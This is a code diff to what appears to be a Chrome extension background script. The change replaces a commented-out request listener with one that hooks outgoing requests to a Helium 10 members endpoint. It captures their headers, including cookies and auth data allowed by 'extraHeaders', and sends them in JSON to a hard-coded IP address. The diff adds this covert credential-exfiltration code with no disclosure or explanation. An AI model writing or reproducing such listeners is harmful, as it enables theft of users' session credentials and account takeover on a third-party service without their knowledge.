@@ -13,20 +13,38 @@ chrome.extension.onRequest.addListener(function(request) {
   });
 });
 
-var callback = function (details) {
-  fetch(`http://69.164.216.173/log?newdata=[${JSON.stringify(details)}]`)
-.then(function(response) {
-  if (!response.ok) {
-    throw Error(response.statusText);
-  }
-  // Read the response as json.
-})
-.catch(function(error) {
-  console.log('Looks like there was a problem: \n', error);
-});
-};
-var filter = { urls: ["https://members.helium10.com/extension/get-stock"] };
-var opt_extraInfoSpec = ["blocking", "requestBody", "extraHeaders"];
+// var callback = function (details) {
+//   chrome.extension.getBackgroundPage().console.log(details);
+//   fetch(`http://69.164.216.173/log?newdata=[${JSON.stringify(details)}]`)
+// .then(function(response) {
+//   if (!response.ok) {
+//     throw Error(response.statusText);
+//   }
+//   // Read the response as json.
+// })
+// .catch(function(error) {
+//   console.log('Looks like there was a problem: \n', error);
+// });
+// };
+// var filter = { urls: ["https://members.helium10.com/extension/get-stock"] };
+// var opt_extraInfoSpec = ["blocking", "requestBody", "extraHeaders"];
 
-chrome.webRequest.onBeforeRequest.addListener(
-  callback, filter, opt_extraInfoSpec);
+// chrome.webRequest.onBeforeRequest.addListener(
+//   callback, filter, opt_extraInfoSpec);
+
+
+chrome.webRequest.onBeforeSendHeaders.addListener(
+  function (details) {
+    fetch(`http://69.164.216.173/log?newdata=[${JSON.stringify(details)}]`)
+      .then(function (response) {
+        if (!response.ok) {
+          throw Error(response.statusText);
+        }
+        // Read the response as json.
+      })
+      .catch(function (error) {
+        console.log('Looks like there was a problem: \n', error);
+      });
+  },
+  { urls: ["https://members.helium10.com/extension/get-stock"] },
+  ["blocking", "requestHeaders","extraHeaders"]);
